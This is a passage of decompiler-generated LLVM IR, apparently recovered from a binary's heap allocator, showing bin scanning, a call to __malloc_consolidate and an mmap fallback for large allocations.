dec_label_pc_15234:                               ; preds = %.dec_label_pc_15234_crit_edge, %dec_label_pc_15234.loopexit, %dec_label_pc_15228
  %v1_15238 = phi i32 [ %v4_1535c, %.dec_label_pc_15234_crit_edge ], [ %v3_150e0, %dec_label_pc_15234.loopexit ], [ %v2_15228, %dec_label_pc_15228 ]
  %v0_15234 = phi i32 [ %v7_1535c, %.dec_label_pc_15234_crit_edge ], [ %v4_150e4, %dec_label_pc_15234.loopexit ], [ %v3_1522c, %dec_label_pc_15228 ]
  %v1_15234 = or i32 %v0_15234, 1
  store i32 %v1_15234, i32* %r3.global-to-local, align 4
  %v2_15238 = add i32 %v1_15238, 4
  %v3_15238 = inttoptr i32 %v2_15238 to i32*
  store i32 %v1_15234, i32* %v3_15238, align 4
  br label %dec_label_pc_157f4

dec_label_pc_15240:                               ; preds = %dec_label_pc_15210
  %v1_15240 = load i32, i32* @sl, align 4
  %v2_15240 = add i32 %v1_15240, %v0_15220
  store i32 %v2_15240, i32* %r2.global-to-local, align 4
  %v1_15244 = or i32 %v1_15240, 1
  store i32 %v1_15244, i32* %r3.global-to-local, align 4
  %v0_15248 = load i32, i32* %lr.global-to-local, align 4
  %v1_15248 = or i32 %v0_15248, 1
  store i32 %v1_15248, i32* %r1.global-to-local, align 4
  store i32 %v1_15220, i32* %r4.global-to-local, align 4
  %v2_15250 = add i32 %v0_15220, 4
  %v3_15250 = inttoptr i32 %v2_15250 to i32*
  store i32 %v1_15244, i32* %v3_15250, align 4
  %v0_15254 = load i32, i32* %r2.global-to-local, align 4
  %v1_15254 = load i32, i32* @r6, align 4
  %v2_15254 = add i32 %v1_15254, 8
  %v3_15254 = inttoptr i32 %v2_15254 to i32*
  store i32 %v0_15254, i32* %v3_15254, align 4
  %v0_15258 = load i32, i32* %r2.global-to-local, align 4
  %v1_15258 = load i32, i32* @r6, align 4
  %v2_15258 = add i32 %v1_15258, 12
  %v3_15258 = inttoptr i32 %v2_15258 to i32*
  store i32 %v0_15258, i32* %v3_15258, align 4
  %v0_1525c = load i32, i32* %lr.global-to-local, align 4
  %v1_1525c = load i32, i32* %r2.global-to-local, align 4
  %v3_1525c = add i32 %v1_1525c, %v0_1525c
  %v4_1525c = inttoptr i32 %v3_1525c to i32*
  store i32 %v0_1525c, i32* %v4_1525c, align 4
  %v0_15260 = load i32, i32* %r1.global-to-local, align 4
  %v1_15260 = load i32, i32* %r2.global-to-local, align 4
  %v2_15260 = add i32 %v1_15260, 4
  %v3_15260 = inttoptr i32 %v2_15260 to i32*
  store i32 %v0_15260, i32* %v3_15260, align 4
  %v0_15264 = load i32, i32* @r6, align 4
  %v1_15264 = load i32, i32* %r2.global-to-local, align 4
  %v2_15264 = add i32 %v1_15264, 12
  %v3_15264 = inttoptr i32 %v2_15264 to i32*
  store i32 %v0_15264, i32* %v3_15264, align 4
  %v0_15268 = load i32, i32* @r6, align 4
  %v1_15268 = load i32, i32* %r2.global-to-local, align 4
  %v2_15268 = add i32 %v1_15268, 8
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  store i32 %v0_15268, i32* %v3_15268, align 4
  br label %dec_label_pc_157f4

dec_label_pc_15274:                               ; preds = %dec_label_pc_151dc, %dec_label_pc_151cc
  %v1_15204 = phi i32 [ %storemerge.pre, %dec_label_pc_151cc ], [ %v3_151e8, %dec_label_pc_151dc ]
  store i32 %v1_15204, i32* %ip.global-to-local, align 4
  %v9_15274 = icmp eq i32 %v1_15204, %v1_151d0
  br i1 %v9_15274, label %dec_label_pc_1527c.loopexit, label %dec_label_pc_151dc

dec_label_pc_1527c.loopexit:                      ; preds = %dec_label_pc_15274
  br label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_151c4.dec_label_pc_1527c_crit_edge, %dec_label_pc_1527c.loopexit
  %v4_152ac.pre-phi = phi i32 [ %.pre200, %dec_label_pc_151c4.dec_label_pc_1527c_crit_edge ], [ %v4_151cc, %dec_label_pc_1527c.loopexit ]
  %v1_1527c = add i32 %v0_1527c.pre, 1
  store i32 %v1_1527c, i32* %r2.global-to-local, align 4
  %v1_15280 = urem i32 %v1_1527c, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r0.global-to-local, align 4
  %v6_1528c = shl i32 1, %v1_15280
  store i32 %v6_1528c, i32* %ip.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_15294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_15294, i32* %r3.global-to-local, align 4
  %v3_15298 = udiv i32 %v1_1527c, 32
  store i32 %v3_15298, i32* @r5, align 4
  %v4_1529c = mul nuw nsw i32 %v3_15298, 4
  %v5_1529c = add i32 %v4_15294, %v4_1529c
  store i32 %v5_1529c, i32* %r2.global-to-local, align 4
  %v1_152a0 = add i32 %v5_1529c, 820
  %v2_152a0 = inttoptr i32 %v1_152a0 to i32*
  %v3_152a0 = load i32, i32* %v2_152a0, align 4
  store i32 %v3_152a0, i32* @r4, align 4
  %v1_152a4 = add i32 %v4_15294, 52
  store i32 %v1_152a4, i32* %r3.global-to-local, align 4
  store i32 36, i32* @r8, align 4
  %v5_152ac = add i32 %v1_152a4, %v4_152ac.pre-phi
  store i32 %v5_152ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_15318, %dec_label_pc_1527c
  %v1_152b8 = phi i32 [ %v1_152b8.pre, %dec_label_pc_15318 ], [ %v3_152a0, %dec_label_pc_1527c ]
  %v0_152b8 = phi i32 [ %v0_152b0.pre, %dec_label_pc_15318 ], [ %v6_1528c, %dec_label_pc_1527c ]
  %v1_152b0 = sub i32 1, %v0_152b8
  %v2_152b0 = icmp ult i32 %v0_152b8, 2
  %v1_152b0. = select i1 %v2_152b0, i32 %v1_152b0, i32 0
  store i32 %v1_152b0., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_152b8, %v1_152b8
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_152b0
  %v5_152bc = or i32 %v1_152b0., 1
  store i32 %v5_152bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152c8.preheader

bb142:                                            ; preds = %dec_label_pc_152b0
  %v2_152c0 = icmp eq i32 %v1_152b0., 0
  br i1 %v2_152c0, label %.dec_label_pc_15304.preheader_crit_edge, label %dec_label_pc_152c8.preheader

.dec_label_pc_15304.preheader_crit_edge:          ; preds = %bb142
  %v0_152fc54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15304.preheader

dec_label_pc_152c8.preheader:                     ; preds = %bb142, %.thread12
  %v0_152c8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_152c8

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152c8.preheader, %dec_label_pc_152d4
  %v0_152c8 = phi i32 [ %v0_152c8.pre, %dec_label_pc_152c8.preheader ], [ %v1_152c8, %dec_label_pc_152d4 ]
  %v1_152c8 = add i32 %v0_152c8, 1
  store i32 %v1_152c8, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_152c8, 2
  br i1 %tmp208, label %dec_label_pc_153a8.loopexit, label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152c8
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r3.global-to-local, align 4
  %v1_152d8 = load i32, i32* @r8, align 4
  %v2_152d8 = add i32 %v1_152d8, ptrtoint (i32* @global_var_28010.981 to i32)
  %v3_152d8 = inttoptr i32 %v2_152d8 to i32*
  %v4_152d8 = load i32, i32* %v3_152d8, align 4
  store i32 %v4_152d8, i32* %r2.global-to-local, align 4
  %v4_152dc = mul i32 %v1_152c8, 4
  %v5_152dc = add i32 %v4_152d8, %v4_152dc
  store i32 %v5_152dc, i32* %r3.global-to-local, align 4
  %v1_152e0 = add i32 %v5_152dc, 820
  %v2_152e0 = inttoptr i32 %v1_152e0 to i32*
  %v3_152e0 = load i32, i32* %v2_152e0, align 4
  store i32 %v3_152e0, i32* @r4, align 4
  %v2_152e4 = icmp eq i32 %v3_152e0, 0
  br i1 %v2_152e4, label %dec_label_pc_152c8, label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152d4
  %v4_152ec = mul i32 %v1_152c8, 256
  %v5_152ec = add i32 %v4_152d8, %v4_152ec
  store i32 %v5_152ec, i32* %r3.global-to-local, align 4
  %v1_152f0 = add i32 %v5_152ec, 44
  store i32 %v1_152f0, i32* %r0.global-to-local, align 4
  %v0_152f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_152f4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15304.preheader

dec_label_pc_15304.preheader:                     ; preds = %.dec_label_pc_15304.preheader_crit_edge, %dec_label_pc_152ec
  %v0_152fc54 = phi i32 [ %v1_152f0, %dec_label_pc_152ec ], [ %v0_152fc54.pre, %.dec_label_pc_15304.preheader_crit_edge ]
  %v0_15320 = phi i32 [ %v3_152e0, %dec_label_pc_152ec ], [ %v1_152b8, %.dec_label_pc_15304.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_152f4, %dec_label_pc_152ec ], [ %v0_152b8, %.dec_label_pc_15304.preheader_crit_edge ]
  %v2_1530451 = and i32 %ip.promoted, %v0_15320
  %v4_1530453 = icmp eq i32 %v2_1530451, 0
  br i1 %v4_1530453, label %dec_label_pc_152fc, label %dec_label_pc_1530c

dec_label_pc_152fc:                               ; preds = %dec_label_pc_15304.preheader, %dec_label_pc_152fc
  %v2_1530056 = phi i32 [ %v2_15300, %dec_label_pc_152fc ], [ %ip.promoted, %dec_label_pc_15304.preheader ]
  %v0_152fc55 = phi i32 [ %v1_152fc, %dec_label_pc_152fc ], [ %v0_152fc54, %dec_label_pc_15304.preheader ]
  %v1_152fc = add i32 %v0_152fc55, 8
  %v2_15300 = mul i32 %v2_1530056, 2
  %v2_15304 = and i32 %v2_15300, %v0_15320
  %v4_15304 = icmp eq i32 %v2_15304, 0
  br i1 %v4_15304, label %dec_label_pc_152fc, label %dec_label_pc_15304.dec_label_pc_1530c_crit_edge

dec_label_pc_15304.dec_label_pc_1530c_crit_edge:  ; preds = %dec_label_pc_152fc
  store i32 %v1_152fc, i32* %r0.global-to-local, align 4
  store i32 %v2_15300, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1530c

dec_label_pc_1530c:                               ; preds = %dec_label_pc_15304.dec_label_pc_1530c_crit_edge, %dec_label_pc_15304.preheader
  %v0_1532c = phi i32 [ %v2_15300, %dec_label_pc_15304.dec_label_pc_1530c_crit_edge ], [ %ip.promoted, %dec_label_pc_15304.preheader ]
  %v0_15350 = phi i32 [ %v1_152fc, %dec_label_pc_15304.dec_label_pc_1530c_crit_edge ], [ %v0_152fc54, %dec_label_pc_15304.preheader ]
  %v1_1530c = add i32 %v0_15350, 12
  %v2_1530c = inttoptr i32 %v1_1530c to i32*
  %v3_1530c = load i32, i32* %v2_1530c, align 4
  store i32 %v3_1530c, i32* @lr, align 4
  %v9_15310 = icmp eq i32 %v3_1530c, %v0_15350
  br i1 %v9_15310, label %dec_label_pc_15318, label %dec_label_pc_15338

dec_label_pc_15318:                               ; preds = %dec_label_pc_1530c
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r0.global-to-local, align 4
  %v1_1531c = load i32, i32* @r8, align 4
  %v2_1531c = add i32 %v1_1531c, ptrtoint (i32* @global_var_28010.981 to i32)
  %v3_1531c = inttoptr i32 %v2_1531c to i32*
  %v4_1531c = load i32, i32* %v3_1531c, align 4
  %v2_15320 = sub i32 -1, %v0_1532c
  %v3_15320 = and i32 %v0_15320, %v2_15320
  store i32 %v3_15320, i32* @r4, align 4
  %v1_15324 = load i32, i32* @r5, align 4
  %v4_15324 = mul i32 %v1_15324, 4
  %v5_15324 = add i32 %v4_15324, %v4_1531c
  store i32 %v5_15324, i32* %r3.global-to-local, align 4
  %v1_15328 = add i32 %v0_15350, 8
  store i32 %v1_15328, i32* %r0.global-to-local, align 4
  %v2_1532c = mul i32 %v0_1532c, 2
  store i32 %v2_1532c, i32* %ip.global-to-local, align 4
  %v2_15330 = add i32 %v5_15324, 820
  %v3_15330 = inttoptr i32 %v2_15330 to i32*
  store i32 %v3_15320, i32* %v3_15330, align 4
  %v0_152b0.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_152b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_152b0

dec_label_pc_15338:                               ; preds = %dec_label_pc_1530c
  %v1_15338 = add i32 %v3_1530c, 4
  %v2_15338 = inttoptr i32 %v1_15338 to i32*
  %v3_15338 = load i32, i32* %v2_15338, align 4
  store i32 %v3_15338, i32* %r3.global-to-local, align 4
  %v1_1533c = and i32 %v3_15338, -4
  store i32 %v1_1533c, i32* %r2.global-to-local, align 4
  %v0_15340 = load i32, i32* @sl, align 4
  %v2_15340 = sub i32 %v1_1533c, %v0_15340
  store i32 %v2_15340, i32* %ip.global-to-local, align 4
  %v1_15344 = add i32 %v3_1530c, 12
  %v2_15344 = inttoptr i32 %v1_15344 to i32*
  %v3_15344 = load i32, i32* %v2_15344, align 4
  store i32 %v3_15344, i32* %r3.global-to-local, align 4
  %tmp209 = icmp ult i32 %v2_15340, 16
  br i1 %tmp209, label %bb143, label %bb144

bb143:                                            ; preds = %dec_label_pc_15338
  %v6_1534c = add i32 %v1_1533c, %v3_1530c
  store i32 %v6_1534c, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_15338, %bb143
  %v2_15350 = add i32 %v3_15344, 8
  %v3_15350 = inttoptr i32 %v2_15350 to i32*
  store i32 %v0_15350, i32* %v3_15350, align 4
  %v0_15354 = load i32, i32* %r3.global-to-local, align 4
  %v1_15354 = load i32, i32* %r0.global-to-local, align 4
  %v2_15354 = add i32 %v1_15354, 12
  %v3_15354 = inttoptr i32 %v2_15354 to i32*
  store i32 %v0_15354, i32* %v3_15354, align 4
  %v4_15358 = load i32, i32* @lr, align 4
  br i1 %tmp209, label %.dec_label_pc_15234_crit_edge, label %dec_label_pc_15364

.dec_label_pc_15234_crit_edge:                    ; preds = %bb144
  %v5_15358 = add i32 %v4_15358, 8
  store i32 %v5_15358, i32* %r4.global-to-local, align 4
  %v4_1535c = load i32, i32* %r2.global-to-local, align 4
  %v5_1535c = add i32 %v4_1535c, 4
  %v6_1535c = inttoptr i32 %v5_1535c to i32*
  %v7_1535c = load i32, i32* %v6_1535c, align 4
  store i32 %v7_1535c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15234

dec_label_pc_15364:                               ; preds = %bb144
  %v1_15364 = load i32, i32* @sl, align 4
  %v2_15364 = add i32 %v1_15364, %v4_15358
  store i32 %v2_15364, i32* %r1.global-to-local, align 4
  %v1_1536c = load i32, i32* @r6, align 4
  %v2_1536c = add i32 %v1_1536c, 8
  %v3_1536c = inttoptr i32 %v2_1536c to i32*
  store i32 %v2_15364, i32* %v3_1536c, align 4
  %v0_15370 = load i32, i32* %r1.global-to-local, align 4
  %v1_15370 = load i32, i32* @r6, align 4
  %v2_15370 = add i32 %v1_15370, 12
  %v3_15370 = inttoptr i32 %v2_15370 to i32*
  store i32 %v0_15370, i32* %v3_15370, align 4
  %v0_15374 = load i32, i32* @r6, align 4
  %v1_15374 = load i32, i32* %r1.global-to-local, align 4
  %v2_15374 = add i32 %v1_15374, 8
  %v3_15374 = inttoptr i32 %v2_15374 to i32*
  store i32 %v0_15374, i32* %v3_15374, align 4
  %v0_15378 = load i32, i32* @r6, align 4
  %v1_15378 = load i32, i32* %r1.global-to-local, align 4
  %v2_15378 = add i32 %v1_15378, 12
  %v3_15378 = inttoptr i32 %v2_15378 to i32*
  store i32 %v0_15378, i32* %v3_15378, align 4
  %tmp210 = icmp ult i32 %v1_15364, 256
  br i1 %tmp210, label %bb145, label %.thread121

bb145:                                            ; preds = %dec_label_pc_15364
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  %v8_15384 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v8_15384, i32* %r3.global-to-local, align 4
  %v4_15388 = load i32, i32* %r1.global-to-local, align 4
  %v6_15388 = add i32 %v8_15384, 48
  %v7_15388 = inttoptr i32 %v6_15388 to i32*
  store i32 %v4_15388, i32* %v7_15388, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_15364, %bb145
  %v0_1538c = load i32, i32* @sl, align 4
  %v1_1538c = or i32 %v0_1538c, 1
  store i32 %v1_1538c, i32* %r2.global-to-local, align 4
  %v0_15390 = load i32, i32* %ip.global-to-local, align 4
  %v1_15390 = or i32 %v0_15390, 1
  store i32 %v1_15390, i32* %r3.global-to-local, align 4
  %v0_15394 = load i32, i32* @lr, align 4
  %v1_15394 = add i32 %v0_15394, 8
  store i32 %v1_15394, i32* %r4.global-to-local, align 4
  %v2_15398 = add i32 %v0_15394, 4
  %v3_15398 = inttoptr i32 %v2_15398 to i32*
  store i32 %v1_1538c, i32* %v3_15398, align 4
  %v0_1539c = load i32, i32* %ip.global-to-local, align 4
  %v1_1539c = load i32, i32* %r1.global-to-local, align 4
  %v3_1539c = add i32 %v1_1539c, %v0_1539c
  %v4_1539c = inttoptr i32 %v3_1539c to i32*
  store i32 %v0_1539c, i32* %v4_1539c, align 4
  %v0_153a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_153a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_153a0 = add i32 %v1_153a0, 4
  %v3_153a0 = inttoptr i32 %v2_153a0 to i32*
  store i32 %v0_153a0, i32* %v3_153a0, align 4
  br label %dec_label_pc_157f4

dec_label_pc_153a8.loopexit:                      ; preds = %dec_label_pc_152c8
  br label %dec_label_pc_153a8

dec_label_pc_153a8:                               ; preds = %dec_label_pc_153a8.loopexit, %dec_label_pc_14fbc, %dec_label_pc_14fc4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %ip.global-to-local, align 4
  %v4_153b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_153b0, i32* @r0, align 4
  %v1_153b4 = add i32 %v4_153b0, 44
  %v2_153b4 = inttoptr i32 %v1_153b4 to i32*
  %v3_153b4 = load i32, i32* %v2_153b4, align 4
  store i32 %v3_153b4, i32* %ip.global-to-local, align 4
  %v1_153b8 = add i32 %v3_153b4, 4
  %v2_153b8 = inttoptr i32 %v1_153b8 to i32*
  %v3_153b8 = load i32, i32* %v2_153b8, align 4
  %v0_153bc = load i32, i32* @sl, align 4
  %v1_153bc = add i32 %v0_153bc, 16
  store i32 %v1_153bc, i32* %r1.global-to-local, align 4
  %v1_153c0 = and i32 %v3_153b8, -4
  store i32 %v1_153c0, i32* %r3.global-to-local, align 4
  %v3_153c4 = icmp ult i32 %v1_153c0, %v1_153bc
  br i1 %v3_153c4, label %dec_label_pc_153f4, label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153a8
  %v2_153d0 = sub i32 %v1_153c0, %v0_153bc
  %v2_153d4 = add i32 %v0_153bc, %v3_153b4
  store i32 %v2_153d4, i32* %r1.global-to-local, align 4
  %v1_153d8 = or i32 %v2_153d0, 1
  store i32 %v1_153d8, i32* %r3.global-to-local, align 4
  %v1_153dc = or i32 %v0_153bc, 1
  store i32 %v1_153dc, i32* %r2.global-to-local, align 4
  %v1_153e0 = add i32 %v3_153b4, 8
  store i32 %v1_153e0, i32* %r4.global-to-local, align 4
  store i32 %v1_153dc, i32* %v2_153b8, align 4
  %v0_153e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_153e8 = load i32, i32* @r0, align 4
  %v2_153e8 = add i32 %v1_153e8, 44
  %v3_153e8 = inttoptr i32 %v2_153e8 to i32*
  store i32 %v0_153e8, i32* %v3_153e8, align 4
  %v0_153ec = load i32, i32* %r3.global-to-local, align 4
  %v1_153ec = load i32, i32* %r1.global-to-local, align 4
  %v2_153ec = add i32 %v1_153ec, 4
  %v3_153ec = inttoptr i32 %v2_153ec to i32*
  store i32 %v0_153ec, i32* %v3_153ec, align 4
  br label %dec_label_pc_157f4

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153a8
  %v1_153f4 = inttoptr i32 %v4_153b0 to i32*
  %v2_153f4 = load i32, i32* %v1_153f4, align 4
  store i32 %v2_153f4, i32* %r3.global-to-local, align 4
  %v1_153f8 = and i32 %v2_153f4, 2
  store i32 %v1_153f8, i32* %ip.global-to-local, align 4
  %v2_153f8 = icmp eq i32 %v1_153f8, 0
  %v1_153fc = add i32 %v4_153b0, 860
  %v2_153fc = inttoptr i32 %v1_153fc to i32*
  %v3_153fc = load i32, i32* %v2_153fc, align 4
  store i32 %v3_153fc, i32* %r1.global-to-local, align 4
  br i1 %v2_153f8, label %dec_label_pc_15414, label %dec_label_pc_15404

dec_label_pc_15404:                               ; preds = %dec_label_pc_153f4
  %v0_15404 = call i32 @__malloc_consolidate()
  %v0_15408 = load i32, i32* @sl, align 4
  %v1_15408 = add i32 %v0_15408, -7
  store i32 %v1_15408, i32* %r0.global-to-local, align 4
  %v1_1540c = call i32 @malloc(i32 %v1_15408)
  store i32 %v1_1540c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_157f0

dec_label_pc_15414:                               ; preds = %dec_label_pc_153f4
  %v1_15414 = add i32 %v4_153b0, 844
  %v2_15414 = inttoptr i32 %v1_15414 to i32*
  %v3_15414 = load i32, i32* %v2_15414, align 4
  store i32 %v3_15414, i32* %r3.global-to-local, align 4
  %v3_15418 = icmp ult i32 %v0_153bc, %v3_15414
  %v1_1541c = add i32 %v3_153fc, -1
  store i32 %v1_1541c, i32* %sb.global-to-local, align 4
  br i1 %v3_15418, label %dec_label_pc_154f0, label %dec_label_pc_15424

dec_label_pc_15424:                               ; preds = %dec_label_pc_15414
  %v1_15424 = add i32 %v4_153b0, 852
  %v2_15424 = inttoptr i32 %v1_15424 to i32*
  %v3_15424 = load i32, i32* %v2_15424, align 4
  store i32 %v3_15424, i32* %r2.global-to-local, align 4
  %v1_15428 = add i32 %v4_153b0, 848
  %v2_15428 = inttoptr i32 %v1_15428 to i32*
  %v3_15428 = load i32, i32* %v2_15428, align 4
  store i32 %v3_15428, i32* %r3.global-to-local, align 4
  %v6_15430 = icmp slt i32 %v3_15428, %v3_15424
  br i1 %v6_15430, label %dec_label_pc_15434, label %dec_label_pc_154f0

dec_label_pc_15434:                               ; preds = %dec_label_pc_15424
  %v1_15434 = add i32 %v0_153bc, 10
  %v2_15438 = add i32 %v1_15434, %v3_153fc
  store i32 %v2_15438, i32* %r3.global-to-local, align 4
  %v2_1543c = sub i32 0, %v3_153fc
  %v3_1543c = and i32 %v2_15438, %v2_1543c
  store i32 %v3_1543c, i32* @r4, align 4
  %tmp211 = icmp ugt i32 %v3_1543c, %v0_153bc
  br i1 %tmp211, label %dec_label_pc_15448, label %dec_label_pc_154f0

dec_label_pc_15448:                               ; preds = %dec_label_pc_15434
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_1543c, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_15460 = call i32 @mmap(i32 0, i32 %v3_1543c, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_15460, i32* %r0.global-to-local, align 4
  %v7_15464 = icmp eq i32 %v6_15460, -1
  br i1 %v7_15464, label %dec_label_pc_15448.dec_label_pc_154f0_crit_edge, label %dec_label_pc_1546c

dec_label_pc_15448.dec_label_pc_154f0_crit_edge:  ; preds = %dec_label_pc_15448
  %v1_15514.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_154f0

dec_label_pc_1546c:                               ; preds = %dec_label_pc_15448
  %v1_1546c = urem i32 %v6_15460, 8
  store i32 %v1_1546c, i32* %r2.global-to-local, align 4
  %v2_1546c = icmp eq i32 %v1_1546c, 0
  br i1 %v2_1546c, label %bb146, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_1546c
  %v2_15470 = sub nsw i32 8, %v1_1546c
  store i32 %v2_15470, i32* %r3.global-to-local, align 4
  %v2_15474 = load i32, i32* @r4, align 4
  %v3_15474 = sub i32 %v2_15474, %v2_15470
  %v3_15478 = add i32 %v2_15470, %v6_15460
  store i32 %v3_15478, i32* %lr.global-to-local, align 4
  %v2_15480 = or i32 %v3_15474, 2
  store i32 %v2_15480, i32* %r2.global-to-local, align 4
  %v5_15488 = inttoptr i32 %v3_15478 to i32*
  store i32 %v2_15470, i32* %v5_15488, align 4
  %v1_1548c = load i32, i32* %r2.global-to-local, align 4
  %v2_1548c = load i32, i32* %lr.global-to-local, align 4
  %v3_1548c = add i32 %v2_1548c, 4
  %v4_1548c = inttoptr i32 %v3_1548c to i32*
  store i32 %v1_1548c, i32* %v4_1548c, align 4
  br label %.thread27

bb146:                                            ; preds = %dec_label_pc_1546c
  store i32 %v6_15460, i32* %lr.global-to-local, align 4
  %v1_1548447 = load i32, i32* @r4, align 4
  %v2_1548448 = or i32 %v1_1548447, 2
  store i32 %v2_1548448, i32* %r3.global-to-local, align 4
  %v3_15490 = inttoptr i32 %v6_15460 to i32*
  store i32 0, i32* %v3_15490, align 4
  %v1_15494 = load i32, i32* %r3.global-to-local, align 4
  %v2_15494 = load i32, i32* %lr.global-to-local, align 4
  %v3_15494 = add i32 %v2_15494, 4
  %v4_15494 = inttoptr i32 %v3_15494 to i32*
  store i32 %v1_15494, i32* %v4_15494, align 4
  br label %.thread27

.thread27:                                        ; preds = %.thread25, %bb146
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* %r2.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_154a0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 36) to i32*), align 4
  store i32 %v4_154a0, i32* %ip.global-to-local, align 4
  %v1_154a4 = add i32 %v4_154a0, 848
  %v2_154a4 = inttoptr i32 %v1_154a4 to i32*
  %v3_154a4 = load i32, i32* %v2_154a4, align 4
  store i32 %v3_154a4, i32* %r3.global-to-local, align 4
  %v1_154a8 = add i32 %v4_154a0, 856
  %v2_154a8 = inttoptr i32 %v1_154a8 to i32*
  %v3_154a8 = load i32, i32* %v2_154a8, align 4
  store i32 %v3_154a8, i32* %r2.global-to-local, align 4
  %v1_154ac = add i32 %v3_154a4, 1
  store i32 %v1_154ac, i32* %r3.global-to-local, align 4
  %v7_154b4 = icmp sgt i32 %v1_154ac, %v3_154a8
  br i1 %v7_154b4, label %bb147, label %bb148

bb147:                                            ; preds = %.thread27
  store i32 %v1_154ac, i32* %v2_154a8, align 4
  %v0_154b8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_154b8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb148

bb148:                                            ; preds = %.thread27, %bb147
  %v1_154b8 = phi i32 [ %v4_154a0, %.thread27 ], [ %v1_154b8.pre, %bb147 ]
  %v0_154b8 = phi i32 [ %v1_154ac, %.thread27 ], [ %v0_154b8.pre, %bb147 ]
  %v2_154b8 = add i32 %v1_154b8, 848
  %v3_154b8 = inttoptr i32 %v2_154b8 to i32*
  store i32 %v0_154b8, i32* %v3_154b8, align 4
  %v0_154bc = load i32, i32* %ip.global-to-local, align 4
  %v1_154bc = add i32 %v0_154bc, 868
  %v2_154bc = inttoptr i32 %v1_154bc to i32*
  %v3_154bc = load i32, i32* %v2_154bc, align 4
  store i32 %v3_154bc, i32* %r3.global-to-local, align 4
  %v1_154c0 = add i32 %v0_154bc, 880
  %v2_154c0 = inttoptr i32 %v1_154c0 to i32*
  %v3_154c0 = load i32, i32* %v2_154c0, align 4
  store i32 %v3_154c0, i32* %r2.global-to-local, align 4
  %v0_154c4 = load i32, i32* @r4, align 4
  %v2_154c4 = add i32 %v0_154c4, %v3_154bc
  store i32 %v2_154c4, i32* %r1.global-to-local, align 4
  %v1_154c8 = add i32 %v0_154bc, 872
  %v2_154c8 = inttoptr i32 %v1_154c8 to i32*
  %v3_154c8 = load i32, i32* %v2_154c8, align 4
  store i32 %v3_154c8, i32* %r3.global-to-local, align 4
  %v1_154d0 = add i32 %v0_154bc, 884
  %v2_154d0 = inttoptr i32 %v1_154d0 to i32*
  %v3_154d0 = load i32, i32* %v2_154d0, align 4
  store i32 %v3_154d0, i32* %r2.global-to-local, align 4
  %tmp212 = icmp ugt i32 %v2_154c4, %v3_154c0
  br i1 %tmp212, label %bb149, label %bb150

bb149:                                            ; preds = %bb148
  store i32 %v2_154c4, i32* %v2_154c0, align 4
  %v0_154d8.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_154d8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %bb148, %bb149
  %v1_154d8 = phi i32 [ %v0_154bc, %bb148 ], [ %v1_154d8.pre, %bb149 ]
  %v0_154d8 = phi i32 [ %v2_154c4, %bb148 ], [ %v0_154d8.pre, %bb149 ]
  %v2_154d8 = add i32 %v1_154d8, 868
  %v3_154d8 = inttoptr i32 %v2_154d8 to i32*
  store i32 %v0_154d8, i32* %v3_154d8, align 4
  %v0_154dc = load i32, i32* %r1.global-to-local, align 4
  %v1_154dc = load i32, i32* %r3.global-to-local, align 4
  %v2_154dc = add i32 %v1_154dc, %v0_154dc
